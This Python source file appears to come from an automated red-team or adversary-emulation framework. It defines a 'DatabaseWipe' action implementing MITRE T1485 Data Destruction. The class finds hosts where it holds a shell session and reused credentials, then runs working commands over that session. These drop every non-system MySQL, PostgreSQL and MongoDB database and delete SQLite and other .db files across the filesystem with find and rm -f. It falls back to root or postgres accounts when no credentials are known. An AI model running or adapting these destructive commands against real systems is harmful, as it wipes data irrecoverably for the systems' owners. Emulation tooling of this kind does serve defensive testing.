
from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif, StateChangeOperation


class DatabaseWipe(Action):
    """
    Implementation of T1485 Data Destruction - Database Wiping.
    
    This action performs database wiping on Linux systems by dropping databases
    using database-specific commands. Supports MySQL/MariaDB, PostgreSQL, SQLite, and MongoDB.
    """

    def __init__(self):
        super().__init__(
            "DatabaseWipe", "T1485", "TA0040", ["loud", "slow"]
        )
        self.noise = 1.0
        self.impact = 1.0
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for DatabaseWipe.

        Requires:
        - A database service (mysql, postgresql, mongodb, etc.) on an asset
        - A shell session (SSH, shell, busybox) on the same asset (for running commands)
        - Credentials from any service on the same asset (can be reused from FTP, etc.)
        - A user matching the credentials username from the same service as the credentials
        """
        input_motif = ActionInputMotif(
            name="InputMotif_DatabaseWipe",
            description="Input motif for DatabaseWipe"
        )

        input_motif.add_template(
            entity=Entity('Asset', alias='asset'),
            template_name="existing_asset",
        )

        # Database service on the asset
        input_motif.add_template(
            entity=Entity('OpenPort', alias='db_port'),
            template_name="existing_db_port",
            relationship_type="has",
            match_on="existing_asset",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Service', alias='db_service'),
            template_name="existing_db_service",
            relationship_type="is_running",
            match_on="existing_db_port",
            invert_relationship=True,
        )

        # Session from any service on the same asset (can be FTP, SSH, etc.)
        input_motif.add_template(
            entity=Entity('OpenPort', alias='session_port'),
            template_name="existing_session_port",
            relationship_type="has",
            match_on="existing_asset",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Service', alias='session_service'),
            template_name="existing_session_service",
            relationship_type="is_running",
            match_on="existing_session_port",
            invert_relationship=True,
        )

        # Session executing on any service (FTP, SSH, etc.)
        input_motif.add_template(
            entity=Entity('Session', alias='session', active=True),
            template_name="existing_session",
            relationship_type="executes_on",
            match_on="existing_session_service",
        )

        # Credentials from any service on the asset (can be reused from FTP, etc.)
        input_motif.add_template(
            entity=Entity('OpenPort', alias='cred_port'),
            template_name="existing_cred_port",
            relationship_type="has",
            match_on="existing_asset",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Service', alias='cred_service'),
            template_name="existing_cred_service",
            relationship_type="is_running",
            match_on="existing_cred_port",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Credentials', alias='credentials'),
            template_name="existing_credentials",
            relationship_type="secured_with",
            match_on="existing_cred_service",
            invert_relationship=False,
            expected_attributes=["username", "password"],
        )

        # User from the same service as the credentials
        input_motif.add_template(
            entity=Entity('User', alias='user'),
            template_name="existing_user",
            relationship_type="is_client",
            match_on="existing_cred_service",
            invert_relationship=False,
        )

        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif for DatabaseWipe.
        
        Updates the database service to mark it as wiped when successful.
        """
        output_motif = ActionOutputMotif(
            name="OutputMotif_DatabaseWipe",
            description="Output motif for DatabaseWipe"
        )
        
        # Template to update the database service with wiped=true
        output_motif.add_template(
            template_name="wiped_db_service",
            entity=Entity("Service", alias="db_service"),
            operation=StateChangeOperation.UPDATE,
            expected_attributes=["wiped"],
        )
        
        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        asset_ip = pattern.get('asset').get('ip_address')
        db_service = pattern.get('db_service')
        service_protocol = db_service.get('protocol')
        session = pattern.get('session')._id
        credentials = pattern.get('credentials')
        username = credentials.get('username') if credentials else 'default'
        session_service = pattern.get('session_service')
        session_service_protocol = session_service.get('protocol') if session_service else 'unknown'
        cred_service = pattern.get('cred_service')
        cred_service_protocol = cred_service.get('protocol') if cred_service else 'unknown'
        return [
            f"Destroy all databases on {service_protocol} service on {asset_ip} using {session_service_protocol} session ({session}) with credentials for user {username} (from {cred_service_protocol} service)"
        ]

    def get_target_query(self) -> Query:
        """
        Get target patterns for database wiping.
        This action targets database services on assets that have active shell sessions and credentials.
        """
        query = self.input_motif.get_query()
        # Target common database service protocols
        query.where(
            self.input_motif.get_template('existing_db_service').entity.protocol.is_in([
                'mysql', 'postgresql', 'mongodb', 'mssql', 'sqlite'
            ])
        )
        # Target shell-capable service protocols (for running database commands)
        query.where(
            self.input_motif.get_template('existing_session_service').entity.protocol.is_in([
                'ssh', 'shell', 'busybox'
            ])
        )
        # Ensure session is shell-capable
        query.where(
            self.input_motif.get_template('existing_session').entity.protocol.is_in([
                'ssh', 'shell', 'busybox'
            ])
        )
        # Ensure credentials username matches user username
        query.where(
            self.input_motif.get_template('existing_user').entity.username ==
            self.input_motif.get_template('existing_credentials').entity.username
        )
        query.ret_all()
        return query

    def _build_file_based_wipe_cmd(self, search_paths: list[str], message_prefix: str = "Removed database") -> str:
        """
        Build a command to find and remove database files.
        
        Args:
            search_paths: List of directory paths to search (e.g., ['/'] or ['/var/lib', '/opt'])
            message_prefix: Prefix for the success message (e.g., "Removed database" or "Removed database file")
        
        Returns:
            Shell command string to find and remove database files
        """
        paths_str = " ".join(search_paths)
        return f"""find {paths_str} -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | while read db; do rm -f "$db" && echo "{message_prefix}: $db"; done"""

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute database wiping commands.
        
        Wipes all databases on a service by:
        1. Detecting database type from service protocol
        2. Executing appropriate DROP DATABASE commands for all databases
        3. For SQLite, removing all database files
        """
        tulpa_session = pattern.get('session')
        tulpa_session_id = tulpa_session.get('id')
        live_session = sessions.get_session(tulpa_session_id)
        db_service = pattern.get('db_service')
        service_protocol = db_service.get('protocol').lower() if db_service and db_service.get('protocol') else ''
        credentials = pattern.get('credentials')
        username = credentials.get('username') if credentials else None
        password = credentials.get('password') if credentials else None
        
        commands_executed = []
        output_lines = []
        
        # MySQL/MariaDB database wiping - drop all databases (excluding system databases)
        if service_protocol in ['mysql', 'mariadb']:
            # Use discovered credentials or fallback to root
            db_user = username if username else 'root'
            if password:
                mysql_cmd = f"""mysql -u {db_user} -p'{password}' -e "SHOW DATABASES;" 2>/dev/null | grep -v -E '^(Database|information_schema|mysql|performance_schema|sys)$' | while read db; do mysql -u {db_user} -p'{password}' -e "DROP DATABASE IF EXISTS \\`$db\\`;" 2>/dev/null; echo "Dropped database: $db"; done"""
            else:
                mysql_cmd = f"""mysql -u {db_user} -e "SHOW DATABASES;" 2>/dev/null | grep -v -E '^(Database|information_schema|mysql|performance_schema|sys)$' | while read db; do mysql -u {db_user} -e "DROP DATABASE IF EXISTS \\`$db\\`;" 2>/dev/null; echo "Dropped database: $db"; done"""
            output = live_session.run_command(mysql_cmd)
            commands_executed.append(mysql_cmd)
            output_lines.append(output)
        
        # PostgreSQL database wiping - drop all databases (excluding system databases)
        elif service_protocol == 'postgresql':
            # Use discovered credentials or fallback to postgres
            db_user = username if username else 'postgres'
            if password:
                # Set PGPASSWORD environment variable for password authentication
                psql_cmd = f"""PGPASSWORD='{password}' psql -U {db_user} -lqt 2>/dev/null | cut -d \\| -f 1 | grep -v -E '^(template|postgres|Name)$' | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | while read db; do [ -n "$db" ] && PGPASSWORD='{password}' psql -U {db_user} -c "DROP DATABASE IF EXISTS \\"$db\\";" 2>/dev/null && echo "Dropped database: $db"; done"""
            else:
                psql_cmd = f"""psql -U {db_user} -lqt 2>/dev/null | cut -d \\| -f 1 | grep -v -E '^(template|postgres|Name)$' | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | while read db; do [ -n "$db" ] && psql -U {db_user} -c "DROP DATABASE IF EXISTS \\"$db\\";" 2>/dev/null && echo "Dropped database: $db"; done"""
            output = live_session.run_command(psql_cmd)
            commands_executed.append(psql_cmd)
            output_lines.append(output)
        
        # MongoDB database wiping - drop all databases except admin, config, and local
        elif service_protocol == 'mongodb':
            # Use discovered credentials or connect without auth
            if username and password:
                mongo_cmd = f"""mongo --quiet -u {username} -p '{password}' --authenticationDatabase admin --eval "db.adminCommand('listDatabases').databases.forEach(function(d){{if(!['admin','config','local'].includes(d.name)){{db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}}}})" 2>/dev/null"""
            elif username:
                mongo_cmd = f"""mongo --quiet -u {username} --eval "db.adminCommand('listDatabases').databases.forEach(function(d){{if(!['admin','config','local'].includes(d.name)){{db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}}}})" 2>/dev/null"""
            else:
                mongo_cmd = """mongo --quiet --eval "db.adminCommand('listDatabases').databases.forEach(function(d){if(!['admin','config','local'].includes(d.name)){db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}})" 2>/dev/null"""
            output = live_session.run_command(mongo_cmd)
            commands_executed.append(mongo_cmd)
            output_lines.append(output)
        
        # SQLite database wiping (find and remove all .db files)
        elif service_protocol == 'sqlite':
            sqlite_cmd = self._build_file_based_wipe_cmd(['/'], "Removed database")
            output = live_session.run_command(sqlite_cmd)
            commands_executed.append(sqlite_cmd)
            output_lines.append(output)
        
        # Generic fallback: try to find and remove common database files
        else:
            generic_cmd = self._build_file_based_wipe_cmd(['/var/lib', '/opt', '/usr/local'], "Removed database file")
            output = live_session.run_command(generic_cmd)
            commands_executed.append(generic_cmd)
            output_lines.append(output)
        
        stdout = "\n".join(output_lines) if output_lines else "No databases found or wiped"
        exit_status = 0 if output_lines and any("Dropped" in line or "Removed" in line for line in output_lines) else 1
        
        return ActionExecutionResult(
            command=commands_executed,
            stdout=stdout,
            exit_status=exit_status,
            session=tulpa_session_id
        )

    def parse_output(self, output: ActionExecutionResult) -> dict:
        """
        Parse the output of the DatabaseWipe action.
        Extracts which databases were wiped from the command output.
        """
        wiped_databases = []
        wiped = False
        lines = output.stdout.split("\n")
        
        for line in lines:
            # Extract database names that were wiped
            if "Dropped database:" in line:
                # Format: "Dropped database: database_name"
                parts = line.split("Dropped database:")
                if len(parts) > 1:
                    db_name = parts[1].strip()
                    if db_name:
                        wiped_databases.append(db_name)
                        wiped = True
            elif "Removed database:" in line or "Removed database file:" in line:
                # Format: "Removed database: /path/to/database.db"
                parts = line.split(":")
                if len(parts) > 1:
                    db_path = parts[1].strip()
                    # Extract just the filename as the database name
                    db_name = db_path.split('/')[-1] if '/' in db_path else db_path
                    if db_name:
                        wiped_databases.append(db_name)
                        wiped = True
        
        return {
            "wiped": wiped,
            "success": output.exit_status == 0 and wiped,
            "wiped_databases": wiped_databases
        }

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
        """
        Populate the output motif for DatabaseWipe.
        
        Updates the database service to mark it as wiped when the wipe operation was successful.
        """
        self.output_motif.reset_context()
        changes: StateChangeSequence = []
        
        # If wipe was successful, mark the database service as wiped
        if discovered_data.get("success"):
            db_service = pattern.get("db_service")
            if db_service:
                # Use the output motif template to update the service with wiped=true
                service_change = self.output_motif.instantiate(
                    template_name="wiped_db_service",
                    match_on_override=db_service,
                    wiped=True,
                )
                changes.append(service_change)
        
        return changes

    def capture_state_change(
        self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Capture state changes from database wiping.
        
        Marks the database service as wiped (wiped=true) when the wipe operation was successful.
        """
        discovered_data = self.parse_output(output)
        changes = self.populate_output_motif(pattern, discovered_data)
        return changes
